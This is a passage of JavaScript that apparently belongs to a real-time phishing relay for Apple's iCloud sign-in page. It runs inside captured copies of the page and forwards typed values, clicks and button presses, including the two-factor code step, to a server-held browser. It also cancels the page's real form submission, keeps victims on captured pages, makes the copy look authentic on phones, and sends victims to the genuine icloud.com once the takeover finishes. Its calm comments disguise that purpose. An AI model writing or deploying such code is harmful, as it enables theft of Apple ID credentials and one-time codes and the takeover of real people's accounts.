      var type = (el.getAttribute("type") || "").toLowerCase();
      if (type === "button" || type === "submit") return el;
      return null;
    }
    if (tag === "a") {
      var href = el.getAttribute("href") || "";
      if (!href || href.charAt(0) === "#") return null;
      try {
        var url = new URL(href, location.href);
        if (url.origin !== location.origin) return el;   // somewhere real
      } catch (err) {
        return null;
      }
      return null;                                       // inside this app
    }
    return null;
  }

  function onClick(event) {
    var target = event.target;
    if (!target || target.nodeType !== 1) return;

    // A press can open something or move to a step that needs more room.
    refitSoon();

    var link = target.closest ? target.closest("a[href]") : null;
    if (link) {
      var href = link.getAttribute("href") || "";
      var next = pageFor(href);
      if (next && next !== pageName()) {
        leaving = true;
        send({ t: "nav", page: next });
        beacon(next);
      } else if (!next && href.charAt(0) !== "#") {
        // Not a captured page, so there is nothing here to serve it. Staying
        // put keeps the session on pages the server can account for.
        event.preventDefault();
      }
    }

    send({ t: "click", key: keyFor(target), x: event.pageX, y: event.pageY });

    // The same press, in the browser the server holds.
    var press = pressable(clickable(target));
    if (press) {
      // The page is sent with it: what a press does can depend on where it
      // was pressed - the flow says which page leads to which.
      send({ t: "press", id: press.id, page: pageName() });
    }
  }

  // ------------------------------------------------------------------
  // Receiving
  // ------------------------------------------------------------------

  function handle(message) {
    if (!message || typeof message.t !== "string") return;

    if (message.t === "session") {
      if (message.gone) {
        // The session this page was opened for is not there any more: the
        // server has forgotten it, or it was never there. The page goes back
        // to the launcher, where a new one is made and the question is asked
        // again.
        refused("the session has gone");
      }
      return;
    }

    if (message.t === "state") {
      if (message.page && message.page !== pageName() && !samePlace(message.page)) {
        // The server is the truth about which page is on screen.
        leaving = true;
        location.replace(namedPath(message.page));
        return;
      }
      var values = message.values || {};
      Object.keys(values).forEach(function (key) {
        apply({
          key: key,
          value: values[key] && values[key].value,
          checked: values[key] && values[key].checked,
        });
      });
      return;
    }

    if (message.t === "finished") {
      // The person has got in. Their own browser is told so first - it is
      // what sends them back to iCloud next time - and then they go.
      writeState({ finished: true, stage: "Signed in" });
      leaving = true;
      location.replace(namedPath(message.page) || "https://www.icloud.com/");
      return;
    }

    if (message.t === "nav") {
      if (leaving || !message.page || message.page === pageName() ||
          samePlace(message.page)) return;
      leaving = true;
      location.replace(namedPath(message.page));
      return;
    }

    if (message.t === "value") {
      apply(message);
      return;
    }

    if (message.t === "browser") {
      applyBrowser(message);
      return;
    }

    if (message.t === "click") {
      marker(message);
      return;
    }
  }

  function receive(event) {
    var message;
    try {
      message = JSON.parse(event.data);
    } catch (err) {
      return;
    }

    // The script sits in the head, so the socket can answer before the body
    // exists. State is applied once the document is ready; a marker can wait
    // too, there is nothing to draw it on yet.
    if (!ready) {
      early.push(message);
      return;
    }

    handle(message);
  }

  function start() {
    ready = true;
    // The body is parsed, so the stylesheets that came with it are in the
    // document: this is the first moment the dark rules can be taken out.
    undark(document);
    fitStyles(document);
    fitFrames(document);
    var pending = early;
    early = [];
    for (var i = 0; i < pending.length; i++) handle(pending[i]);
  }

  function onSubmit(event) {
    // A captured form is not submitted here: the browser behind it is the
    // one that has a session, and the press is sent there instead. The
    // page's own handlers still run - this only cancels the navigation.
    event.preventDefault();
  }

  // ------------------------------------------------------------------
  // The page it was captured as
  //
  // A capture is a light page, laid out for the window it was taken in. Two
  // things about that are not true of every screen it is shown on, and both
  // of them are fixed here rather than in the file - the captures are never
  // written to:
  //
  //   * the stylesheet turns the page dark when the machine showing it is in
  //     dark mode, and a phone usually is. The dark rules are taken out of
  //     the stylesheets themselves rather than overridden one by one: with
  //     nothing overriding the light palette, what is left is the page that
  //     was captured, colours and all.
  //
  //   * the sign-in form lives in a frame of a fixed height - the height
  //     Apple's page had when it was captured, 209px - and that frame was
  //     told not to scroll. Apple's own script grew the frame to fit; a copy
  //     with no Apple script behind it does not, so on a phone, where the
  //     same form needs more than 209px, the bottom of it is cut off:
  //     "Resend code to iPhone" is there, and cannot be reached. So the
  //     frame is measured and sized to what is in it.
  //
  // Both work on a document of any depth, because a frame is a document with
  // a stylesheet and a height of its own.
  // ------------------------------------------------------------------

  function isDark(text) {
    var said = String(text || "").toLowerCase();
    return said.indexOf("prefers-color-scheme") >= 0 &&
           said.indexOf("dark") >= 0 && said.indexOf("light") < 0;
  }

  function undarkRules(holder, rules) {
    // Backwards: deleting a rule moves every rule after it down.
    var removed = 0;
    for (var i = rules.length - 1; i >= 0; i--) {
      var rule = rules[i];
      if (!rule) continue;
      var media = rule.media ? String(rule.media.mediaText || "") : "";
      if (media && isDark(media)) {
        try {
          holder.deleteRule(i);
          removed += 1;
        } catch (err) {
          // A rule the browser will not let go of is left where it is.
        }
        continue;
      }
      if (rule.cssRules && rule.cssRules.length) {
        removed += undarkRules(rule, rule.cssRules);
      }
    }
    return removed;
  }

  function undark(doc) {
    var sheets = (doc && doc.styleSheets) || [];
    var removed = 0;
    for (var i = 0; i < sheets.length; i++) {
      var rules = null;
      try {
        rules = sheets[i].cssRules;      // same origin: this works
      } catch (err) {
        rules = null;                    // another site's stylesheet: left alone
      }
      if (rules) removed += undarkRules(sheets[i], rules);
    }
    // The browser paints text boxes, dropdowns and the scrollbar from this,
    // and a dark one in a page that is otherwise light looks like a mistake.
    try {
      if (doc && doc.documentElement && doc.documentElement.style) {
        doc.documentElement.style.colorScheme = "light";
      }
    } catch (err) {
      // Nothing to do about a document that will not take it.
    }
    return removed;
  }

  // The font the page is read in: Montserrat, served by this app from
  // /fonts/. Served, not fetched from a font house - a page that asks a font
  // house for its font is a page that looks broken wherever that font house
  // cannot be reached, and this app is meant to run on a machine that may have
  // no network at all. The licence sits next to the font (SIL Open Font
  // License 1.1, fonts/OFL-Montserrat.txt).
  //
  // The face is one variable file, so one file covers every weight the
  // capture asks for - the headings, the body, the buttons.
  //
  // This is the fallback, for a page that did not bring its own copy: every
  // capture in src/ carries the font inside itself (see inline_font.py), and
  // that copy is the one that must win - a face declared later for the same
  // family replaces the one before it, so declaring this one as well would
  // bring back the fetch, and the flash with it. `block`, not `swap`: a font
  // that arrives late should not be drawn over a fallback nobody asked for.
  var FACE = [
    "@font-face {",
    '  font-family: "Montserrat";',
    "  font-style: normal;",
    "  font-weight: 100 900;",
    "  font-display: block;",
    '  src: url("/fonts/montserrat-latin.woff2") format("woff2");',
    "}"
  ].join("\n");

  // What is used when the font has not arrived - the first time a page is
  // drawn, or a machine that will not take it. The page is readable in any of
  // them; Montserrat is the one it is meant to be read in.
  var FONT = ['"Montserrat"', '"Helvetica Neue"', "Helvetica", "Arial",
              "sans-serif"].join(", ");

  // What the capture cannot know about the screen it is shown on. It is
  // deliberately short: the page is the page, and this is only what has to
  // be said for a phone - and the font it is read in.
  var RULES = [
    // One font for the whole page, the frames included, and by !important
    // rather than by inheritance: Apple's stylesheet names a font on almost
    // every element, and a font named on the element itself is not inherited
    // over. The capture has no icon font of its own - its symbols are SVG and
    // images - so nothing here is a glyph that stops being a glyph.
    "html, body, body * { font-family: " + FONT + " !important; }",
    "body { overflow-x: hidden !important; }",
    "iframe, frame { display: block !important; width: 100% !important;",
    "  max-width: 100% !important; }",
    "@media (max-width: 759px) {",
    "  .home-login-component .parent-container {",
    "    width: 100% !important; max-width: 100% !important; }",
    "  .root-viewport { min-height: 100% !important; }",
    "}"
  ].join("\n");

  // A page that brought its own copy of the font is left to it.
  function fitsCSS(doc) {
    var own = doc.querySelector &&
      doc.querySelector('style[data-icloud="font"]');
    return own ? RULES : FACE + "\n" + RULES;
  }

  function fitStyles(doc) {
    if (!doc || doc.__icloudFits || !doc.createElement) return false;
    var head = doc.head || (doc.getElementsByTagName
      ? doc.getElementsByTagName("head")[0] : null) || doc.documentElement;
    if (!head) return false;
    try {
      var element = doc.createElement("style");
      element.setAttribute("data-icloud", "fits");
      element.textContent = fitsCSS(doc);
      head.appendChild(element);
      doc.__icloudFits = true;
      return true;
    } catch (err) {
      return false;
    }
  }

  // Where the lowest thing that can be seen ends, in the document's own
  // coordinates. A scroll height is not enough on its own: a container told
  // to be 100% tall with its content hidden inside it reports the height it
  // was given, not the height it is really using - and that is exactly the
  // shape the cut-off form has.
  function lowestBottom(doc) {
    if (!doc || !doc.body || !doc.body.querySelectorAll) return 0;
    var nodes = doc.body.querySelectorAll("*");
    var scrolled = doc.documentElement.scrollTop || 0;
    if (doc.body.scrollTop) scrolled = Math.max(scrolled, doc.body.scrollTop);
    var bottom = 0;
    for (var i = 0; i < nodes.length && i < 400; i++) {
      var el = nodes[i];
      if (!el.getBoundingClientRect) continue;
      var box = null;
      try {
        box = el.getBoundingClientRect();
      } catch (err) {
        continue;
      }
      if (!box || !box.height) continue;
      var view = doc.defaultView;
      if (view && view.getComputedStyle) {
        var look = view.getComputedStyle(el);
        if (look && (look.display === "none" || look.visibility === "hidden")) {
          continue;
        }
      }
      bottom = Math.max(bottom, box.bottom + scrolled);
    }
    return Math.ceil(bottom);
  }

  function frameHeight(frame) {
    var doc = null;
    try {
      doc = frame.contentDocument;      // same origin: this works
    } catch (err) {
      return 0;                          // another site's frame: left alone
    }
    if (!doc || !doc.documentElement) return 0;
    var tall = doc.documentElement.scrollHeight || 0;
    tall = Math.max(tall, doc.documentElement.offsetHeight || 0);
    if (doc.body) {
      tall = Math.max(tall, doc.body.scrollHeight || 0,
                      doc.body.offsetHeight || 0);
    }
    return Math.max(tall, lowestBottom(doc));
  }

  function fitFrame(frame) {
    if (!frame || !frame.style) return 0;
    var tall = frameHeight(frame);
    if (!tall) return 0;
    if (String(frame.style.height) !== tall + "px") {
      frame.style.height = tall + "px";
    }
    // It fits now, so there is nothing to scroll to: a frame that scrolls
    // inside a page that scrolls is two scrollbars for one form.
    if (frame.getAttribute && frame.getAttribute("scrolling") !== "no") {
      try { frame.setAttribute("scrolling", "no"); } catch (err) {}
    }
    return tall;
  }

  function fitFrames(target) {
    var frames = framesIn(target);
    for (var i = 0; i < frames.length; i++) fitFrame(frames[i]);
    return frames.length;
  }

  var fitTimer = null;

  function refitSoon() {
    // A frame is taller when the form in it is: an error line arrives, a step
    // needs more room. Measured after the change, so the bottom stays
    // reachable.
    if (fitTimer) return;
    fitTimer = setTimeout(function () {
      fitTimer = null;
      // Inside out: a frame inside a frame has to be the right size before
      // the frame holding it can be measured.
      for (var i = documents.length - 1; i >= 0; i--) {
        fitFrames(documents[i].doc);
      }
    }, 120);
  }

  // ------------------------------------------------------------------
  // The frames
  //
  // A capture carries the sign-in form inside a frame, and a frame that is
  // not reachable - one of another origin, or one the browser has not let
  // this page into - is left alone. A reachable one is a document of its
  // own, and it is bound as one.
  // ------------------------------------------------------------------

  function bindDocument(doc) {
    if (!doc || doc.__icloudBound) return false;
    doc.__icloudBound = true;

    var id = documentId(doc);
    documents.push({ id: id, doc: doc });

    // The page as it was captured: light, in a frame that fits it, and with
    // its fields saying what they are so the browser can fill them.
    undark(doc);
    fitStyles(doc);
    fitFrames(doc);
    recognise(doc);

    // The page's own script may draw the form after this document is bound,
    // so the fields are looked at again when the document changes - once,
    // after the change has settled.
    try {
      var Watch = (doc.defaultView && doc.defaultView.MutationObserver) ||
        window.MutationObserver;
      var pending = null;
      new Watch(function () {
        if (pending) return;
        pending = setTimeout(function () {
          pending = null;
          recognise(doc);
        }, 200);
      }).observe(doc.documentElement, { childList: true, subtree: true });
    } catch (err) {
      /* a document that will not be watched is still a document */
    }

    doc.addEventListener("input", onFieldEvent, true);
    doc.addEventListener("change", onFieldEvent, true);
    doc.addEventListener("click", onClick, true);
    doc.addEventListener("submit", onSubmit, true);
    doc.addEventListener("load", onFrameLoad, true);

    // This document may hold fields the browser knows about and the page
    // does not, so the state is asked for again now that it is bound.
    askWhere();
    return true;
  }

  function framesIn(target) {
    if (!target || !target.querySelectorAll) return [];
    var found = target.querySelectorAll("iframe, frame");
    var out = [];
    for (var i = 0; i < found.length; i++) out.push(found[i]);
    return out;
  }

  function descend(target) {
    var inner = [];
    // The target may itself be a frame - that is the usual case: a frame
    // that has just finished loading is handed over as the target.
    var tag = (target && target.tagName || "").toLowerCase();
    if (tag === "iframe" || tag === "frame") inner.push(target);

    var found = framesIn(target);
    for (var i = 0; i < found.length; i++) inner.push(found[i]);

    for (var j = 0; j < inner.length; j++) {
      var doc = null;
      try {
        doc = inner[j].contentDocument;     // same origin: this works
      } catch (err) {
        doc = null;                         // another site: leave it be
      }
      if (!doc) continue;
      if (bindDocument(doc)) descend(doc);
    }
  }

  function onFrameLoad(event) {
    // A frame that has just finished loading may hold the fields, and may
    // hold frames of its own.
    var target = event.target;
    if (!target) return;
    if ((target.tagName || "").toLowerCase() !== "iframe" &&
        (target.tagName || "").toLowerCase() !== "frame") return;
    // A frame's document is complete now, so what it carries can be undone
    // and measured - and it may be taller than the frame it is in.
    var doc = null;
    try {
      doc = target.contentDocument;
    } catch (err) {
      doc = null;
    }
    if (doc) {
      undark(doc);
      fitStyles(doc);
    }
    fitFrame(target);
    descend(target);
    // Measured again now that the frames inside it have been taken in hand:
    // they are part of how tall it is.
    fitFrame(target);
    // ...and once more shortly after, when the frame's own fonts and images
    // have landed and it is as tall as it is really going to be.
    setTimeout(function () {
      fitFrame(target);
    }, 400);
  }

  // A page that changes size is a frame that has to be measured again: the
  // keyboard opening, the phone turning, an error line arriving.
  window.addEventListener("resize", refitSoon);

  // The step is noted before the socket opens: the server is told where
  // this person is when it says hello.
  noteStage();

  bindDocument(document);
  descend(document);

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", start);
  } else {
    start();
  }

  connect();

  // One handle, so the page can be inspected from the console without
  // reaching into a closure.
  window.__icloudSync = {
    keyFor: keyFor,
    apply: apply,
    documents: documents,
    findById: findById,
    undark: undark,
    fitFrame: fitFrame,
    fitFrames: fitFrames,
    namedPath: namedPath,
    launcherUrl: launcherUrl,
  };
})();
